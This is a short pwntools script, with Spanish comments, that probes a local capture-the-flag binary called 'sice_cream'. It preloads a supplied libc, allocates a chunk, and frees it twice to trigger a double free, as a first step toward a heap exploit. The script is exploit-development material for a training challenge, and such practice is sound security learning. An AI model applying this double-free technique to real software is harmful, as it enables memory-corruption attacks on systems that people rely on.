#!/usr/bin/env python3
from pwn import *

# EJECUTAR LOCALMENTE CON LA LIBC CORRECTA
context.log_level = 'debug'
context.arch = 'amd64'

# IMPORTANTE: Usar LD_PRELOAD como dice el hint
p = process('./sice_cream', env={'LD_PRELOAD': './libc.so.6'})

# Introducir nombre
p.sendlineafter(b'name?', b'test')

# Ver menú
print(p.recvuntil(b'>'))

# Comprar helado
p.sendline(b'1')
print(p.recvuntil(b'?'))  # How much?
p.sendline(b'32')
print(p.recvuntil(b'>'))

# Free
p.sendline(b'2') 
print(p.recvuntil(b'?'))  # Which one?
p.sendline(b'0')
print(p.recvuntil(b'>'))

# Double free - free el mismo chunk otra vez
p.sendline(b'2')
print(p.recvuntil(b'?'))
p.sendline(b'0')  # Double free!

# Ver si crashea o qué pasa
print(p.recvall())